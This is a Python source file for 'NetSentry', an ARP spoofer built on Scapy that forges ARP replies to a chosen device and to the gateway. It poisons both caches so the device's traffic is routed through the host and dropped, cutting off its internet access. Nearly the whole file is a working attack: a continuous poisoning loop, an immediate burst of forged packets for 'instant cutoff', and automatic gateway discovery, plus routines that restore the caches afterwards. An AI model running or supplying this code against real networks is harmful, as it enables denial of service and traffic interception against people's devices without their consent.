"""
NetSentry - ARP Spoofer
Host-based internet blocking via ARP cache poisoning.
Sends forged ARP replies to redirect traffic through the host PC,
then drops packets to deny internet access to the target device.
Pure Python implementation with Qt-compatible Signal API.
"""

import time
import logging
import threading
from typing import Optional, Dict, Callable, List

logger = logging.getLogger("netsentry.arp_spoofer")

# Try to import scapy
try:
    from scapy.all import ARP, Ether, sendp, getmacbyip, conf
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("Scapy not available. ARP spoofing will not work.")


class Signal:
    """Pure-Python thread-safe signal compatible with PyQt signal API."""
    def __init__(self):
        self._handlers = []
        self._lock = threading.Lock()

    def connect(self, handler: Callable):
        with self._lock:
            if handler not in self._handlers:
                self._handlers.append(handler)

    def disconnect(self, handler: Callable):
        with self._lock:
            if handler in self._handlers:
                self._handlers.remove(handler)

    def emit(self, *args, **kwargs):
        with self._lock:
            handlers = list(self._handlers)
        for h in handlers:
            try:
                h(*args, **kwargs)
            except Exception as e:
                logger.error(f"Signal dispatch error: {e}")


class ARPSpoofer:
    """
    ARP Spoofing engine that poisons the target's ARP cache to
    redirect their internet traffic through the host PC, then
    drops it to block internet access.

    For each blocked device, continuously sends:
    1. To target: "I am the gateway" (forged ARP reply)
    2. To gateway: "I am the target" (forged ARP reply)

    Signals:
        block_started: Emitted when blocking begins for a device (mac, ip)
        block_stopped: Emitted when blocking ends for a device (mac, ip)
        spoof_error: Emitted on error (error message)
        status_update: Emitted with status info dict
    """

    def __init__(self, gateway_ip: str = None, gateway_mac: str = None,
                 interval: float = 1.0, parent=None):
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.interval = interval  # seconds between ARP packets

        self.block_started = Signal()   # mac, ip
        self.block_stopped = Signal()   # mac, ip
        self.spoof_error = Signal()     # error_msg
        self.status_update = Signal()   # dict

        self._targets: Dict[str, dict] = {}  # MAC -> {ip, mac, active}
        self._lock = threading.Lock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._packets_sent = 0

    def isRunning(self) -> bool:
        """Qt API compatibility."""
        return self._running and self._thread is not None and self._thread.is_alive()

    def is_alive(self) -> bool:
        return self.isRunning()

    def _ensure_gateway_details(self):
        """Auto-detect gateway IP and MAC if not set."""
        if not self.gateway_ip:
            from core.network_utils import get_default_gateway
            self.gateway_ip = get_default_gateway()

        if not self.gateway_mac and self.gateway_ip:
            from core.network_utils import get_gateway_mac
            self.gateway_mac = get_gateway_mac(self.gateway_ip)

        if not self.gateway_mac and self.gateway_ip and SCAPY_AVAILABLE:
            try:
                self.gateway_mac = getmacbyip(self.gateway_ip)
            except Exception:
                pass

    def start(self):
        """Start the background spoofing thread."""
        if self.isRunning():
            return

        self._ensure_gateway_details()
        self._running = True
        self._thread = threading.Thread(target=self._run_loop, daemon=True, name="ARPSpooferThread")
        self._thread.start()
        logger.info(f"ARP Spoofer thread started. Gateway: {self.gateway_ip} ({self.gateway_mac})")

    def stop(self):
        """Stop the spoofing loop and restore all ARP caches."""
        if not self._running:
            return
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        self._restore_all()
        logger.info("ARP Spoofer stopped. All ARP caches restored.")

    def add_target(self, ip: str, mac: str):
        """Add a device to the block list and immediately poison ARP."""
        norm_mac = mac.lower().replace("-", ":").strip()
        with self._lock:
            self._targets[norm_mac] = {
                "ip": ip,
                "mac": norm_mac,
                "active": True
            }
        logger.info(f"Added block target: {ip} ({norm_mac})")

        # Make sure gateway info and worker loop are active
        self._ensure_gateway_details()
        if not self.isRunning():
            self.start()

        # Immediately send initial burst of forged packets for instant cutoff
        if SCAPY_AVAILABLE and self.gateway_ip and self.gateway_mac:
            try:
                for _ in range(3):
                    self._send_spoof_packets(ip, norm_mac)
                    time.sleep(0.05)
            except Exception as e:
                logger.error(f"Error during immediate block packets: {e}")

        self.block_started.emit(norm_mac, ip)

    def remove_target(self, mac: str):
        """Remove a device from the block list and restore its ARP cache."""
        norm_mac = mac.lower().replace("-", ":").strip()
        with self._lock:
            target = self._targets.pop(norm_mac, None)

        if target:
            # Restore legitimate ARP entries
            self._restore_arp(target["ip"], target["mac"])
            logger.info(f"Removed block target: {target['ip']} ({norm_mac})")
            self.block_stopped.emit(norm_mac, target["ip"])

    def get_blocked_devices(self) -> List[str]:
        """Return list of currently blocked device MACs."""
        with self._lock:
            return list(self._targets.keys())

    def is_blocked(self, mac: str) -> bool:
        """Check if a specific device is currently blocked."""
        norm_mac = mac.lower().replace("-", ":").strip()
        with self._lock:
            return norm_mac in self._targets

    def _run_loop(self):
        """Main spoofing loop."""
        if not SCAPY_AVAILABLE:
            self.spoof_error.emit("Scapy is not installed. ARP spoofing requires Scapy and Npcap.")
            self._running = False
            return

        conf.verb = 0
        self._ensure_gateway_details()

        while self._running:
            try:
                # If gateway MAC is still missing, try resolving again
                if not self.gateway_mac:
                    self._ensure_gateway_details()

                with self._lock:
                    targets = dict(self._targets)

                if targets and self.gateway_ip and self.gateway_mac:
                    for mac, target in targets.items():
                        if not self._running:
                            break
                        self._send_spoof_packets(target["ip"], target["mac"])

                    self.status_update.emit({
                        "active_blocks": len(targets),
                        "packets_sent": self._packets_sent,
                        "gateway_ip": self.gateway_ip,
                    })

                # Sleep in short increments for responsive shutdown
                slices = int(self.interval / 0.1) if self.interval > 0.1 else 1
                for _ in range(slices):
                    if not self._running:
                        break
                    time.sleep(0.1)

            except Exception as e:
                logger.error(f"ARP spoof loop error: {e}", exc_info=True)
                self.spoof_error.emit(str(e))
                time.sleep(1.0)

        # Ensure all ARP caches are restored on exit
        self._restore_all()

    def _send_spoof_packets(self, target_ip: str, target_mac: str):
        """
        Send forged ARP packets to both the target and the gateway.

        Packet 1 (to target): "The gateway IP is at MY MAC"
        Packet 2 (to gateway): "The target IP is at MY MAC"
        """
        if not self.gateway_ip or not self.gateway_mac or not target_ip or not target_mac:
            return

        try:
            # Packet to target: claim to be the gateway
            pkt_to_target = Ether(dst=target_mac) / ARP(
                op=2,                   # ARP Reply ("is-at")
                psrc=self.gateway_ip,   # Claim to be the gateway
                hwdst=target_mac,
                pdst=target_ip
            )

            # Packet to gateway: claim to be the target
            pkt_to_gateway = Ether(dst=self.gateway_mac) / ARP(
                op=2,                   # ARP Reply ("is-at")
                psrc=target_ip,         # Claim to be the target
                hwdst=self.gateway_mac,
                pdst=self.gateway_ip
            )

            sendp(pkt_to_target, verbose=False)
            sendp(pkt_to_gateway, verbose=False)
            self._packets_sent += 2

        except Exception as e:
            logger.error(f"Failed to send spoof packets to {target_ip} ({target_mac}): {e}")

    def _restore_arp(self, target_ip: str, target_mac: str):
        """
        Restore legitimate ARP entries for a specific target.
        Send correct ARP replies to both target and gateway.
        """
        if not SCAPY_AVAILABLE or not self.gateway_ip or not self.gateway_mac or not target_ip:
            return

        try:
            logger.info(f"Restoring legitimate ARP for {target_ip} ({target_mac})")

            # Send correct ARP to target: gateway is at gateway's real MAC
            restore_target = Ether(dst=target_mac) / ARP(
                op=2,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac,
                hwdst=target_mac,
                pdst=target_ip
            )

            # Send correct ARP to gateway: target is at target's real MAC
            restore_gateway = Ether(dst=self.gateway_mac) / ARP(
                op=2,
                psrc=target_ip,
                hwsrc=target_mac,
                hwdst=self.gateway_mac,
                pdst=self.gateway_ip
            )

            # Send multiple times to ensure cache update
            for _ in range(5):
                sendp(restore_target, verbose=False)
                sendp(restore_gateway, verbose=False)
                time.sleep(0.1)

        except Exception as e:
            logger.error(f"Failed to restore ARP for {target_ip}: {e}")

    def _restore_all(self):
        """Restore ARP caches for ALL currently blocked devices."""
        with self._lock:
            targets = dict(self._targets)

        for mac, target in targets.items():
            self._restore_arp(target["ip"], target["mac"])
